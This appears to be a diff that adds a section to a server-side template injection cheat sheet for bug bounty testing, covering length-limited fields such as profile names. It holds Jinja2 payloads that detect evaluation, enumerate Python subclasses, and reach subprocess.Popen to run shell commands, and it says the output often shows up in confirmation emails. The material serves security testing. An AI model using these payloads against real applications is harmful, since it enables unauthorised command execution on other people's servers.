@@ -58,6 +58,15 @@ ${7*7}           → 49 = Freemarker / Velocity / Mako (all use ${...})
 <%= `id` %>
 ```
 
+### Length-constrained injection fields (profile name, display name, subject)
+When the injectable field caps input length (a profile-name / display-name field is often ≤30-64 chars), the full `os.popen` one-liner won't fit — but detection and class-enumeration still do. Confirm with the short probe, then enumerate the gadget index in stages instead of one payload:
+```python
+{{ '7'*7 }}                                  # detection, fits anywhere
+{{ [].__class__.__base__.__subclasses__() }} # dump class list, pick the index for subprocess.Popen/os
+{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}
+```
+The reflected sink is frequently an **outbound email** (the account-update / confirmation mail rendering your name), not the web page — read the email body for the evaluated output. Disclosed: reports/125980 (profile-name → Jinja2 → confirmation email, length-limited).
+
 ### Where to Test
 ```
 Name/bio/description fields, email templates, invoice name, PDF generators,
